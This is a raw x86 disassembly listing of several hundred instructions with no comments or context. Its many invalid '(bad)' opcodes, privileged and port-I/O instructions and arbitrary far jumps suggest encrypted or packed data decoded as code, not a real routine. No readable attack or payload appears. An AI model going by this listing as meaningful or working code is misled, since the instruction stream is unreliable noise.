  41c11d:	ss push 0x65
  41c120:	popf   
  41c121:	push   ecx
  41c122:	jmp    ebx
  41c124:	xor    al,0x9b
  41c126:	fwait
  41c127:	and    bh,dh
  41c129:	iret   
  41c12a:	pop    ebx
  41c12b:	jo     0x41c115
  41c12d:	jae    0x41c0ff
  41c12f:	mov    edi,0xc7f991d9
  41c134:	into   
  41c135:	int3   
  41c136:	push   ds
  41c137:	xor    ebx,ebx
  41c139:	shr    DWORD PTR [eax+0xf72b235],1
  41c13f:	mov    dh,0xae
  41c141:	cmc    
  41c142:	sub    esp,DWORD PTR [ebx+edi*8-0x7d]
  41c146:	jb     0x41c163
  41c148:	arpl   WORD PTR [edx+0x6bc8fde7],cx
  41c14e:	data16 data16 (bad) 
  41c152:	stos   BYTE PTR es:[edi],al
  41c153:	cmp    DWORD PTR [esi+edx*8+0x53],ebx
  41c157:	cmp    ebp,esi
  41c159:	test   al,0x1c
  41c15b:	and    al,bh
  41c15d:	push   esi
  41c15e:	clc    
  41c15f:	jne    0x41c128
  41c161:	sbb    BYTE PTR ds:0x98970222,dl
  41c167:	leave  
  41c168:	popa   
  41c169:	mov    eax,0xbcba3a5e
  41c16e:	pop    edi
  41c16f:	fbld   TBYTE PTR [ecx-0x5e]
  41c172:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c173:	mov    cl,0x1a
  41c175:	mov    bh,0x58
  41c177:	mov    esi,0x637d7c5c
  41c17c:	and    edx,DWORD PTR [esi-0x3633dcb7]
  41c182:	nop
  41c183:	xchg   BYTE PTR [edi-0x318aa4e0],dl
  41c189:	jl     0x41c175
  41c18b:	rcl    DWORD PTR [ebp-0x3e],cl
  41c18e:	dec    esi
  41c18f:	mov    cl,0xaa
  41c191:	adc    cl,0x6a
  41c194:	adc    esi,ebx
  41c196:	retf   
  41c197:	fiadd  DWORD PTR ds:0x70dd80e8
  41c19d:	push   edi
  41c19e:	repnz sub ebp,DWORD PTR [ecx+0x5e]
  41c1a2:	sub    ebx,DWORD PTR [ebp+eax*2-0x7f0c1c3e]
  41c1a9:	data16 or BYTE PTR [ecx+esi*2],0xff
  41c1ae:	mov    ds:0xa7f6949d,eax
  41c1b3:	repnz pop esp
  41c1b5:	pop    edi
  41c1b6:	lods   eax,DWORD PTR ds:[esi]
  41c1b7:	(bad)  
  41c1b8:	retf   
  41c1b9:	lahf   
  41c1ba:	mov    ecx,0x23f21c2e
  41c1bf:	jne    0x41c1f4
  41c1c1:	int3   
  41c1c2:	and    edx,0x1b
  41c1c5:	stc    
  41c1c6:	jbe    0x41c18e
  41c1c8:	inc    ebx
  41c1c9:	outs   dx,DWORD PTR ds:[esi]
  41c1ca:	loopne 0x41c159
  41c1cc:	inc    ebp
  41c1cd:	nop
  41c1ce:	hlt    
  41c1cf:	inc    ebx
  41c1d0:	mov    ch,BYTE PTR [edi-0x547dd553]
  41c1d6:	add    al,0x7a
  41c1d8:	(bad)  
  41c1d9:	adc    esi,DWORD PTR [esp+eax*8+0x12aff731]
  41c1e0:	daa    
  41c1e1:	add    al,0x7e
  41c1e3:	jmp    0xcd87c33e
  41c1e8:	jge    0x41c1b5
  41c1ea:	jae    0x41c1c6
  41c1ec:	addr16 fsub st,st(4)
  41c1ef:	adc    edx,esi
  41c1f1:	call   0x9be7e347
  41c1f6:	scas   al,BYTE PTR es:[edi]
  41c1f7:	lahf   
  41c1f8:	(bad)  
  41c1f9:	mov    DWORD PTR [eax],ecx
  41c1fb:	pop    eax
  41c1fc:	aas    
  41c1fd:	xor    eax,0x8a29a5df
  41c202:	mov    ds:0x1c513de7,eax
  41c207:	outs   dx,BYTE PTR ds:[esi]
  41c208:	rcl    ebp,0xb4
  41c20b:	dec    esp
  41c20c:	adc    al,0xe6
  41c20e:	ret    0xcf8b
  41c211:	(bad)  
  41c212:	popa   
  41c213:	ins    DWORD PTR es:[edi],dx
  41c214:	in     al,dx
  41c215:	das    
  41c216:	gs push esi
  41c218:	cdq    
  41c219:	mov    DWORD PTR ds:0xe61fc0c4,ebx
  41c21f:	aaa    
  41c220:	les    ebp,FWORD PTR ds:0xfbd69a6f
  41c226:	sbb    BYTE PTR [esi+eax*2],0x8d
  41c22a:	xchg   BYTE PTR [edi-0x1e95a9c2],bh
  41c230:	and    eax,DWORD PTR [ecx-0x4]
  41c233:	push   edi
  41c234:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c235:	int    0xff
  41c237:	jno    0x41c276
  41c239:	mov    dl,0x9a
  41c23b:	mov    dl,0x58
  41c23d:	pop    edx
  41c23e:	(bad)  
  41c23f:	psubsw mm7,QWORD PTR [esi+0x1d2d91c8]
  41c246:	out    dx,eax
  41c247:	jge    0x41c247
  41c249:	push   0x7e44ab34
  41c24e:	adc    eax,0xfccddf4
  41c253:	mov    edx,0x4af52a77
  41c258:	add    BYTE PTR [edx+edi*8],dh
  41c25b:	fs or  ebp,ebp
  41c25e:	aaa    
  41c25f:	adc    eax,0x57b84aa3
  41c264:	fstp   DWORD PTR [ecx-0x6d]
  41c267:	xchg   BYTE PTR ds:0xc14facaf,bh
  41c26d:	outs   dx,DWORD PTR ds:[esi]
  41c26e:	loop   0x41c28d
  41c270:	es into 
  41c272:	retf   
  41c273:	mov    DWORD PTR [ebp+0x56],edx
  41c276:	js     0x41c232
  41c278:	mov    bl,0x2
  41c27a:	adc    BYTE PTR [ebp+0x620ab56b],bh
  41c280:	ss ds mov edi,0xbf0c3ba2
  41c287:	add    eax,0x50eca911
  41c28c:	or     cl,BYTE PTR [edi+eiz*1-0x29e56604]
  41c293:	lahf   
  41c294:	cs push edi
  41c296:	(bad)  
  41c297:	cmp    eax,0x3a89aa9
  41c29c:	mov    edx,DWORD PTR [esi]
  41c29e:	push   es
  41c29f:	or     al,ah
  41c2a1:	icebp  
  41c2a2:	jge    0x41c2fb
  41c2a4:	sub    dl,BYTE PTR [edi+0x4dc72f2e]
  41c2aa:	push   edx
  41c2ab:	pop    ecx
  41c2ac:	xor    esi,DWORD PTR [edi+eax*1]
  41c2af:	xchg   DWORD PTR [ebx+esi*4],edx
  41c2b2:	aad    0xd7
  41c2b4:	sbb    DWORD PTR fs:[edx+0x543db623],eax
  41c2bb:	jle    0x41c30a
  41c2bd:	cwde   
  41c2be:	pop    es
  41c2bf:	push   edi
  41c2c0:	sub    dh,BYTE PTR [esi+eax*8+0x37da4b26]
  41c2c7:	adc    BYTE PTR [eax],ch
  41c2c9:	cwde   
  41c2ca:	cmp    esi,DWORD PTR [ebp+0x60]
  41c2cd:	dec    edi
  41c2ce:	or     al,0x14
  41c2d0:	cld    
  41c2d1:	outs   dx,BYTE PTR ds:[esi]
  41c2d2:	dec    ebx
  41c2d3:	push   eax
  41c2d4:	bound  edx,QWORD PTR [edx-0x2e]
  41c2d7:	inc    esp
  41c2d8:	inc    ebx
  41c2d9:	aas    
  41c2da:	fldcw  WORD PTR [ecx-0x7c6afddd]
  41c2e0:	clc    
  41c2e1:	or     BYTE PTR [edx+0x55516608],bl
  41c2e7:	xor    BYTE PTR [edx+0xe],dh
  41c2ea:	jle    0x41c2ce
  41c2ec:	mov    cl,0x70
  41c2ee:	mov    ah,0xb7
  41c2f0:	addr16 jne 0x41c2cc
  41c2f3:	lods   al,BYTE PTR ds:[esi]
  41c2f4:	daa    
  41c2f5:	cld    
  41c2f6:	lods   eax,DWORD PTR ds:[esi]
  41c2f7:	xor    DWORD PTR [eax-0x7],edx
  41c2fa:	and    DWORD PTR [ecx*1+0x212609b3],esp
  41c301:	xor    BYTE PTR [ebx-0x4df6ddf9],dl
  41c307:	jne    0x41c296
  41c309:	cmp    BYTE PTR [ebx+0x2b],0x9a
  41c30d:	sbb    BYTE PTR [edi-0x21d94a9c],0x56
  41c314:	inc    esp
  41c315:	(bad)  
  41c316:	xor    bh,BYTE PTR [ecx]
  41c318:	mov    eax,esp
  41c31a:	in     al,0x3b
  41c31c:	out    dx,eax
  41c31d:	mov    bh,0xee
  41c31f:	cs cli 
  41c321:	pop    ebp
  41c322:	push   es
  41c323:	enter  0xff87,0xee
  41c327:	adc    DWORD PTR [esi+0x68fff81d],0x6
  41c32e:	and    ebp,DWORD PTR [edi+edi*4+0x4725fa64]
  41c335:	mov    ebx,DWORD PTR ds:0xe6025153
  41c33b:	ins    DWORD PTR es:[edi],dx
  41c33c:	add    DWORD PTR [edx+0x1157764b],eax
  41c342:	ror    DWORD PTR [ecx+0x4],0x5c
  41c346:	int3   
  41c347:	xlat   BYTE PTR ds:[ebx]
  41c348:	lea    edi,fs:[ebp+0x6c9617b0]
  41c34f:	into   
  41c350:	cdq    
  41c351:	out    0x1,al
  41c353:	and    BYTE PTR [eax-0x38adfc16],cl
  41c359:	push   esi
  41c35a:	les    ecx,FWORD PTR [edx+ecx*4]
  41c35d:	xchg   DWORD PTR [edx-0x44],ebx
  41c360:	popf   
  41c361:	pop    ds
  41c362:	stc    
  41c363:	cs pop ebx
  41c365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c366:	adc    eax,0x4747922
  41c36b:	xchg   ecx,eax
  41c36c:	popf   
  41c36d:	jno    0x41c3a8
  41c36f:	pop    ebx
  41c370:	dec    ebx
  41c371:	retf   0xc614
  41c374:	shl    esi,cl
  41c376:	shl    al,0x18
  41c379:	fwait
  41c37a:	mov    ebp,0xce7e6085
  41c37f:	fsub   DWORD PTR [ebp-0x8]
  41c382:	mov    eax,ds:0x9d08fde
  41c387:	xchg   ebx,eax
  41c388:	jge    0x41c31c
  41c38a:	mov    gs,WORD PTR [ebx+0x39]
  41c38d:	dec    edi
  41c38e:	xor    eax,0x5a94100c
  41c393:	nop
  41c394:	xchg   ebp,eax
  41c395:	nop
  41c396:	aaa    
  41c397:	push   ds
  41c398:	xchg   ebp,eax
  41c399:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c39a:	or     eax,0x83d051a0
  41c39f:	jg     0x41c3e8
  41c3a1:	xchg   edi,eax
  41c3a2:	(bad)  
  41c3a3:	sbb    DWORD PTR [ebp+0x5eb438d1],0xffffffe6
  41c3aa:	loopne 0x41c3db
  41c3ac:	mov    bl,0x5f
  41c3ae:	cdq    
  41c3af:	out    dx,al
  41c3b0:	repz imul edx,eax,0xffffff82
  41c3b4:	sti    
  41c3b5:	mov    bh,0x90
  41c3b7:	sbb    DWORD PTR [eax],esi
  41c3b9:	ss sbb al,0xb3
  41c3bc:	mov    al,ds:0xf94c0cf8
  41c3c1:	ds add eax,0x5cea5449
  41c3c7:	inc    ecx
  41c3c8:	or     DWORD PTR [ebx],ecx
  41c3ca:	nop
  41c3cb:	or     eax,0x5108b30e
  41c3d0:	in     al,dx
  41c3d1:	enter  0x719c,0x5
  41c3d5:	arpl   WORD PTR [ebx+esi*2-0x7feaf1e4],si
  41c3dc:	mov    al,0x4e
  41c3de:	test   al,0x3a
  41c3e0:	xor    bl,BYTE PTR ds:[ebp-0x7e]
  41c3e4:	push   ss
  41c3e5:	sub    cl,BYTE PTR [esp+edi*2]
  41c3e8:	stos   BYTE PTR es:[edi],al
  41c3e9:	sub    DWORD PTR [esi+0x1fdbcf2f],esi
  41c3ef:	xchg   ebp,eax
  41c3f0:	jns    0x41c385
  41c3f2:	js     0x41c42f
  41c3f4:	jmp    0x41c377
  41c3f6:	mov    al,ds:0x5cef7975
  41c3fb:	fwait
  41c3fc:	sub    DWORD PTR [esi],edi
  41c3fe:	pop    edx
  41c3ff:	pop    ds
  41c400:	fsubp  st(0),st
  41c402:	cdq    
  41c403:	std    
  41c404:	iret   
  41c405:	ret    0x4643
  41c408:	push   edx
  41c409:	ins    BYTE PTR es:[edi],dx
  41c40a:	js     0x41c488
  41c40c:	jmp    0x321f:0x7751a690
  41c413:	cwde   
  41c414:	fild   DWORD PTR [ecx+0x5c]
  41c417:	into   
  41c418:	cmp    BYTE PTR [edi+0x5599fff8],bh
  41c41e:	in     eax,0x40
  41c420:	jmp    0x41c48d
  41c422:	daa    
  41c423:	cmc    
  41c424:	and    dh,al
  41c426:	sub    BYTE PTR [esi],bh
  41c428:	stc    
  41c429:	mov    edi,0xb9ab958c
  41c42e:	dec    ebx
  41c42f:	int    0x97
  41c431:	sbb    al,0x9f
  41c433:	out    dx,eax
  41c434:	push   ebx
  41c435:	popa   
  41c436:	cmc    
  41c437:	mov    ch,BYTE PTR [ecx+eiz*2-0x34]
  41c43b:	popf   
  41c43c:	push   ds
  41c43d:	stos   BYTE PTR es:[edi],al
  41c43e:	xor    DWORD PTR [ecx],edi
  41c440:	repnz lock cmp BYTE PTR [edx-0x4f],ah
  41c445:	aam    0x56
  41c447:	cdq    
  41c448:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c449:	pop    es
  41c44a:	lahf   
  41c44b:	cmp    esi,ecx
  41c44d:	mov    cl,0xe1
  41c44f:	push   cs
  41c450:	sub    al,BYTE PTR [ecx]
  41c452:	mov    ds:0x8eb7933a,eax
  41c457:	sbb    BYTE PTR [ebp+0xf],al
  41c45a:	jmp    0x693c0a29
  41c45f:	into   
  41c460:	mov    cl,BYTE PTR [ecx+0x14]
  41c463:	mov    esi,0x3746b769
  41c468:	sub    BYTE PTR [edi+0x62],bh
  41c46b:	jo     0x41c438
  41c46d:	push   ecx
  41c46e:	or     esp,ebp
  41c470:	imul   esp,DWORD PTR [esi-0x3cc1b82],0x66
  41c477:	call   0x37f17084
  41c47c:	outs   dx,DWORD PTR ds:[esi]
  41c47d:	pop    eax
  41c47e:	xchg   BYTE PTR [ebx],al
  41c480:	inc    esp
  41c481:	das    
  41c482:	xchg   ebp,eax
  41c483:	ror    BYTE PTR [esi],cl
  41c485:	xor    BYTE PTR [eax],ch
  41c487:	add    esp,DWORD PTR [esi]
  41c489:	test   al,0xd0
  41c48b:	ret    
  41c48c:	pop    edx
  41c48d:	int    0x9d
  41c48f:	ins    DWORD PTR es:[edi],dx
  41c490:	jp     0x41c4f7
  41c492:	mov    ds:0xba977e81,al
  41c497:	das    
  41c498:	sbb    eax,0xc3bfa6c3
  41c49d:	dec    esi
  41c49e:	mov    edx,0x2aede0df
  41c4a3:	sbb    al,0x14
  41c4a5:	cmp    al,0x83
  41c4a7:	aam    0xfa
  41c4a9:	lds    ecx,FWORD PTR gs:[edi]
  41c4ac:	xchg   esi,eax
  41c4ad:	cld    
  41c4ae:	and    eax,0xe77b44b3
  41c4b3:	gs push ss
  41c4b5:	repz jne 0x41c522
  41c4b8:	inc    DWORD PTR ds:[eax-0x4feca716]
  41c4bf:	fcom   DWORD PTR [ecx]
  41c4c1:	push   edx
  41c4c2:	outs   dx,BYTE PTR ds:[esi]
  41c4c3:	in     al,dx
  41c4c4:	add    BYTE PTR [edi],bh
  41c4c6:	xchg   edx,eax
  41c4c7:	jae    0x41c538
  41c4c9:	sub    eax,DWORD PTR [edi-0xc]
  41c4cc:	fs mov ah,0xa6
  41c4cf:	sbb    esi,ecx
  41c4d1:	call   FWORD PTR [ebx+0x1c2e6906]
  41c4d7:	xchg   ebp,eax
  41c4d8:	loope  0x41c533
  41c4da:	sbb    cl,BYTE PTR [edx-0x1c]
  41c4dd:	jge    0x41c498
  41c4df:	out    0x98,al
  41c4e1:	and    al,BYTE PTR [eax]
  41c4e3:	idiv   DWORD PTR [edx+0x7d]
  41c4e6:	bound  ebp,QWORD PTR [ecx-0x53]
  41c4e9:	jge    0x41c4ee
  41c4eb:	cmp    bl,BYTE PTR [eax+0x65]
  41c4ee:	xchg   ecx,eax
  41c4ef:	sbb    BYTE PTR ds:0xee8425ad,bl
  41c4f5:	(bad)  
  41c4f6:	icebp  
  41c4f7:	push   ebp
  41c4f8:	nop
  41c4f9:	nop
  41c4fa:	fs jo  0x41c50b
  41c4fd:	push   ds
  41c4fe:	pusha  
  41c4ff:	xchg   DWORD PTR [edx],eax
  41c501:	adc    al,BYTE PTR fs:[ecx]
  41c504:	mov    dl,0x21
  41c506:	jl     0x41c49f
  41c508:	cmp    eax,0xd4a303b2
  41c50d:	ret    
  41c50e:	mov    dh,0x0
  41c510:	cmp    BYTE PTR [esp+edx*8-0x5b],0xef
  41c515:	mov    DWORD PTR [ecx+0x7e],edx
  41c518:	aas    
  41c519:	pop    edx
  41c51a:	sbb    BYTE PTR [edx-0x39],al
  41c51d:	aaa    
  41c51e:	sub    ebx,ecx
  41c520:	and    eax,0x61caf957
  41c525:	xchg   esi,eax
  41c526:	cwde   
  41c527:	mov    ch,0xcd
  41c529:	lock jnp 0x41c514
  41c52c:	jno    0x41c565
  41c52e:	jmp    0xe8f69ee4
  41c533:	cmc    
  41c534:	pop    edx
  41c535:	pop    es
  41c536:	xor    bh,dl
  41c538:	out    0x97,al
  41c53a:	sub    eax,0x15eb30c9
  41c53f:	mov    ebx,0x4dd23f61
  41c544:	ja     0x41c5a6
  41c546:	cmp    cl,BYTE PTR [ecx-0x59]
  41c549:	(bad)  
  41c54a:	repz (bad) 
  41c54c:	js     0x41c5cd
  41c54e:	cli    
  41c54f:	arpl   WORD PTR ds:0x77073247,bp
  41c555:	(bad)
  41c558:	lock das 
  41c55a:	inc    esp
  41c55b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c55c:	push   ss
  41c55d:	and    bh,bh
  41c55f:	sti    
  41c560:	jno    0x41c5b9
  41c562:	push   eax
  41c563:	dec    ebp
  41c564:	test   al,0x2e
  41c566:	or     esp,ebp
  41c568:	aam    0x36
  41c56a:	dec    edi
  41c56b:	push   ss
  41c56c:	add    dl,BYTE PTR [ebp-0x9]
  41c56f:	icebp  
  41c570:	mov    ch,0xc
  41c572:	sub    DWORD PTR [ebx+0x28],0xb623b492
  41c579:	or     DWORD PTR [eax+ebp*8],eax
  41c57c:	scas   al,BYTE PTR es:[edi]
  41c57d:	dec    ecx
  41c57e:	xor    BYTE PTR [ecx-0x31e670de],dh
  41c584:	loop   0x41c56f
  41c586:	pop    ds
  41c587:	ret    0xd14d
  41c58a:	imul   ebx,DWORD PTR [ecx],0x55
  41c58d:	fld    QWORD PTR [ebx-0x2bb1bf15]
  41c593:	inc    esp
  41c594:	sbb    eax,0xe29e06a6
  41c599:	into   
  41c59a:	mov    edi,0xcaa4fb40
  41c59f:	arpl   WORD PTR [edx],di
  41c5a1:	mov    cl,0x3b
  41c5a3:	out    0x6,eax
  41c5a5:	call   0x8e23b70e
  41c5aa:	mov    dl,0x23
  41c5ac:	cld    
  41c5ad:	inc    edi
  41c5ae:	call   0x480f:0x21968fbb
  41c5b5:	dec    edx
  41c5b6:	jo     0x41c5ae
  41c5b8:	addr16 inc ax
  41c5bb:	out    0x5b,eax
  41c5bd:	mov    dl,0x8a
  41c5bf:	and    edx,eax
  41c5c1:	dec    ebx
  41c5c2:	adc    DWORD PTR [esp+ebp*1-0x19],eax
  41c5c6:	retf   0xe9dc
  41c5c9:	pop    ebp
  41c5ca:	jmp    0x313aa78b
  41c5cf:	das    
  41c5d0:	clc    
  41c5d1:	xchg   esi,eax
  41c5d2:	jmp    0x8ff4:0xf786deaf
  41c5d9:	and    bh,bl
  41c5db:	sti    
  41c5dc:	or     bl,dh
  41c5de:	inc    esi
  41c5df:	sbb    eax,0x646b64f6
  41c5e4:	push   ss
  41c5e5:	pop    edi
  41c5e6:	jl     0x41c610
  41c5e8:	icebp  
  41c5e9:	cmp    BYTE PTR [esi],dl
  41c5eb:	add    DWORD PTR [edi+0x43],0xd003139
  41c5f2:	repz pop ecx
  41c5f4:	and    eax,0x5c2eea09
  41c5f9:	test   BYTE PTR [esi-0x45a7c0d3],dl
  41c5ff:	aad    0x0
  41c601:	fild   WORD PTR [ebx+0x7c]
  41c604:	lock pop edi
  41c606:	test   al,0xfd
  41c608:	nop
  41c609:	or     DWORD PTR [esi],esp
  41c60b:	xor    dl,BYTE PTR [edx+0x40]
  41c60e:	fwait
  41c60f:	bound  esp,QWORD PTR [eax]
  41c611:	out    dx,al
  41c612:	and    eax,0x3712a830
  41c617:	cs dec ecx
  41c619:	int3   
  41c61a:	imul   edi,DWORD PTR [edx-0x7c2fa0fa],0x41508e97
  41c624:	inc    eax
  41c625:	(bad)  
  41c626:	xor    ebp,DWORD PTR [ebp-0x39]
  41c629:	test   DWORD PTR [esi],esp
  41c62b:	push   ecx
  41c62c:	adc    ah,cl
  41c62e:	ret    0xd61a
  41c631:	mov    bh,0x2a
  41c633:	(bad)  
  41c634:	std    
  41c635:	div    ebp
  41c637:	out    0x2,al
  41c639:	arpl   WORD PTR [eax+0x43],ax
  41c63c:	inc    ebx
  41c63d:	outs   dx,BYTE PTR ds:[esi]
  41c63e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c63f:	push   esp
  41c640:	and    edx,DWORD PTR [ecx-0x1]
  41c643:	fdiv   st,st(6)
  41c645:	jae    0x41c5fc
  41c647:	push   ss
  41c648:	lea    ecx,[ecx-0x45]
  41c64b:	adc    ebp,DWORD PTR fs:[edx+0x3c]
  41c64f:	(bad)  
  41c650:	sbb    al,0x7a
  41c652:	jp     0x41c671
  41c654:	push   0x254d3209
  41c659:	mov    esi,0xcd1e9962
  41c65e:	jmp    0x8493825b
  41c663:	loopne 0x41c674
  41c665:	mov    edx,0x333e00a4
  41c66a:	repz sti 
  41c66c:	push   cs
  41c66d:	jg     0x41c60c
  41c66f:	inc    esp
  41c670:	xchg   edx,eax
  41c671:	popa   
  41c672:	sbb    DWORD PTR [edx+0x61],0xffffffae
  41c676:	mov    DWORD PTR [eax-0x4937af5e],edi
  41c67c:	jnp    0x41c6d3
  41c67e:	mov    bh,0xa7
  41c680:	stc    
  41c681:	push   ecx
  41c682:	push   ecx
  41c683:	or     al,0xa0
  41c685:	in     al,0x3
  41c687:	add    edx,edi
  41c689:	mov    edx,0x223123d9
  41c68e:	retf   
  41c68f:	pop    es
  41c690:	jmp    0x4d2425d1
  41c695:	jmp    0x41c61a
  41c697:	ins    BYTE PTR es:[edi],dx
  41c698:	lahf   
  41c699:	ror    DWORD PTR [ebx],1
  41c69b:	test   dl,dh
  41c69d:	iret   
  41c69e:	outs   dx,BYTE PTR ds:[esi]
  41c69f:	mov    edi,0xaee3bf58
  41c6a4:	dec    ebx
  41c6a5:	loopne 0x41c66f
  41c6a7:	scas   al,BYTE PTR es:[edi]
  41c6a8:	(bad)  
  41c6a9:	dec    edx
  41c6aa:	sahf   
  41c6ab:	nop
  41c6ac:	cmp    eax,0x430e53f8
  41c6b1:	lds    eax,FWORD PTR [ebx-0x44]
  41c6b4:	repz dec esi
  41c6b6:	sub    edi,DWORD PTR ds:0x793ff060
  41c6bc:	push   cs
  41c6bd:	ja     0x41c737
  41c6bf:	xchg   ecx,eax
  41c6c0:	inc    ebp
  41c6c1:	inc    ebx
  41c6c2:	mov    WORD PTR [eax],gs
  41c6c4:	stc    
  41c6c5:	mov    dl,0x8c
  41c6c7:	xchg   ecx,eax
  41c6c8:	mov    dh,0xc4
  41c6ca:	or     dh,al
  41c6cc:	xchg   DWORD PTR [ebx],esi
  41c6ce:	or     al,0x28
  41c6d0:	mov    ds:0x50c9f88d,al
  41c6d5:	inc    ebp
  41c6d6:	imul   edi,ecx,0xffffffcf
  41c6d9:	cld    
  41c6da:	cmp    ebx,DWORD PTR [edi+0x68]
  41c6dd:	xchg   ebx,eax
  41c6de:	mov    ds:0xcbeef76c,al
  41c6e3:	jge    0x41c6b3
  41c6e5:	addr16 mov edx,0xb446457a
  41c6eb:	rol    esi,cl
  41c6ed:	or     ebx,edx
  41c6ef:	fiadd  DWORD PTR [ebx+ebp*2]
  41c6f2:	push   cs
  41c6f3:	sti    
  41c6f4:	add    bl,BYTE PTR [ebx+0x61]
  41c6f7:	and    DWORD PTR [ebx-0x29],ebx
  41c6fa:	mov    ah,0xcc
  41c6fc:	sub    DWORD PTR [ebx],ebx
  41c6fe:	test   al,0x91
  41c700:	xchg   edi,eax
  41c701:	sub    BYTE PTR [esi+0x1f],al
  41c704:	rol    BYTE PTR [eax-0x7d698f29],cl
  41c70a:	or     BYTE PTR [edi+0x21595be6],bh
  41c710:	fbld   TBYTE PTR [eax]
  41c712:	adc    ebp,esp
  41c714:	enter  0x5373,0xe5
  41c718:	adc    dh,BYTE PTR [edi]
  41c71a:	(bad)  
  41c71b:	ret    0x149
  41c71e:	iret   
  41c71f:	jb     0x41c6c4
  41c721:	jmp    0x41c6ff
  41c723:	dec    edi
  41c724:	push   esp
  41c725:	hlt    
  41c726:	and    ch,dh
  41c728:	fnstenv [eax+0x4889f399]
  41c72e:	add    ah,BYTE PTR ds:0xfb620e2e
  41c734:	cs fwait
  41c736:	sbb    ah,BYTE PTR [ebp-0x30611ef9]
  41c73c:	pop    esi
  41c73d:	jg     0x41c77d
  41c73f:	aam    0x5
  41c741:	imul   edx,DWORD PTR [ebx-0x5c],0x9a6a509f
  41c748:	fild   DWORD PTR [ebx]
  41c74a:	sub    dh,BYTE PTR [edi]
  41c74c:	shl    DWORD PTR [edx],0x2b
  41c74f:	push   ebp
  41c750:	rcl    BYTE PTR [eax+0x645e5f14],1
  41c756:	jae    0x41c7bd
  41c758:	fnstcw WORD PTR [edi+0x30]
  41c75b:	lods   eax,DWORD PTR ds:[esi]
  41c75c:	jnp    0x41c786
  41c75e:	js     0x41c74e
  41c760:	add    DWORD PTR [ebx-0x46ff9c9],esi
  41c766:	cli    
  41c767:	pop    edx
  41c768:	hlt    
  41c769:	and    DWORD PTR [eax+edx*2-0x2dcd8346],0x314b5bc8
  41c774:	push   esp
  41c775:	pop    esp
  41c776:	pop    esp
  41c777:	xchg   ebp,eax
  41c778:	scas   eax,DWORD PTR es:[edi]
  41c779:	les    eax,FWORD PTR [ebx]
  41c77b:	lea    ebp,[ebx]
  41c77d:	lds    edx,FWORD PTR [eax]
  41c77f:	mov    ch,0x7e
  41c781:	shl    BYTE PTR [edi],0xdc
  41c784:	popa   
  41c785:	xchg   ecx,eax
  41c786:	and    al,0xf2
  41c788:	jne    0x41c7e9
  41c78a:	jb     0x41c735
  41c78c:	cmp    DWORD PTR [edx+0xb],0x2a8d62c
  41c793:	fld    TBYTE PTR [esi]
  41c795:	orps   xmm6,XMMWORD PTR [ebp+0x2d00dd10]
  41c79c:	mov    ds:0x93a7a3e9,eax
  41c7a1:	add    al,0xa9
  41c7a3:	lods   eax,DWORD PTR ds:[esi]
  41c7a4:	outs   dx,DWORD PTR ds:[esi]
  41c7a5:	cli    
  41c7a6:	lahf   
  41c7a7:	adc    eax,0x15f9615e
  41c7ac:	adc    al,0xc7
  41c7ae:	iret   
  41c7af:	(bad)  
  41c7b0:	repnz lea esp,ss:[ebx+0x38]
  41c7b5:	pop    es
  41c7b6:	fisttp QWORD PTR [edx+0x50]
  41c7b9:	or     esi,ebp
  41c7bb:	xlat   BYTE PTR ds:[ebx]
  41c7bc:	scas   al,BYTE PTR es:[edi]
  41c7bd:	push   ds
  41c7be:	inc    edi
  41c7bf:	test   eax,0x3fa86a5a
  41c7c4:	xchg   esp,eax
  41c7c5:	sbb    esi,ecx
  41c7c7:	sub    ebx,DWORD PTR [ebp+ebx*1+0x5f82a5db]
  41c7ce:	sub    al,0x3f
  41c7d0:	sbb    ch,BYTE PTR [ecx-0x15d0d292]
  41c7d6:	stos   DWORD PTR es:[edi],eax
  41c7d7:	pop    edx
  41c7d8:	jns    0x41c77e
  41c7da:	test   eax,0xf33ab2eb
  41c7df:	xchg   BYTE PTR [ecx-0x20],ch
  41c7e2:	xchg   esi,eax
  41c7e3:	cs dec ecx
  41c7e5:	outs   dx,BYTE PTR ds:[esi]
  41c7e6:	jns    0x41c836
  41c7e8:	sub    al,0x46
  41c7ea:	cmp    ch,BYTE PTR [esi+0x62106ec7]
  41c7f0:	into   
  41c7f1:	(bad)  
  41c7f2:	mov    bl,0x75
  41c7f4:	mov    bl,0xb9
  41c7f6:	add    edx,eax
  41c7f8:	hlt    
  41c7f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c7fa:	dec    eax
  41c7fb:	in     al,0x59
  41c7fd:	fwait
  41c7fe:	into   
  41c7ff:	cmc    
  41c800:	xchg   DWORD PTR [edx-0x23a07dc7],ebx
  41c806:	dec    esi
  41c807:	jne    0x41c806
  41c809:	loopne 0x41c845
  41c80b:	and    DWORD PTR [esi+0xdd4d641],esi
  41c811:	retf   
  41c812:	pop    ebx
  41c813:	push   ecx
  41c814:	inc    edi
  41c815:	pop    edi
  41c816:	shl    BYTE PTR [esi+eiz*2],0xdd
  41c81a:	clc    
  41c81b:	xchg   edx,eax
  41c81c:	adc    al,0x77
  41c81e:	lahf   
  41c81f:	ss pop ds
  41c821:	adc    dh,ch
  41c823:	mov    fs,eax
  41c825:	xor    eax,0x59e7a141
  41c82a:	xor    DWORD PTR [edx],esp
  41c82c:	and    eax,0x9c8ba1ab
  41c831:	or     eax,0x6978100d
  41c836:	dec    edx
  41c837:	pop    edx
  41c838:	stc    
  41c839:	mov    bl,0x36
  41c83b:	enter  0x4491,0xd9
  41c83f:	dec    edx
  41c840:	loope  0x41c86e
  41c842:	clc    
  41c843:	add    ah,BYTE PTR [ebp-0x58]
  41c846:	loope  0x41c858
  41c848:	inc    ebx
  41c849:	sub    ebp,esi
  41c84b:	jmp    0x41c7ee
  41c84d:	sub    bh,BYTE PTR [edx]
  41c84f:	push   0x70
  41c851:	pop    edx
  41c852:	out    0xfc,eax
  41c854:	xor    ebx,esp
  41c856:	iret   
  41c857:	xor    DWORD PTR es:[edx],esp
  41c85a:	cld    
  41c85b:	xchg   edi,eax
  41c85c:	lock jbe 0x41c825
  41c85f:	repnz hlt 
  41c861:	sbb    BYTE PTR cs:[esi-0x15f851f5],dl
  41c868:	rol    BYTE PTR [esi+0x8d77435],0x10
  41c86f:	fild   DWORD PTR [esi+0x58]
  41c872:	inc    ebx
